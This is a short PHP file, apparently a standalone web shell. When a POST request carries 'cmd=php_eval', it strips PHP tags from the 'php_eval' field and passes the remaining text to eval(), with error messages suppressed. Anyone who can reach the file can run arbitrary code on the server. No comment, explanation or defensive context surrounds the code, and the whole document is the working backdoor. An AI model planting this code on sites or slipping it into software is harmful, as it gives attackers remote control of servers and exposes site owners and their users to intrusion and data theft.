<?php
if ($_POST['cmd']=="php_eval"){
    $eval = @str_replace("<?","",$_POST['php_eval']);
    $eval = @str_replace("?>","",$eval);
    @eval($eval);
}
 
 ?>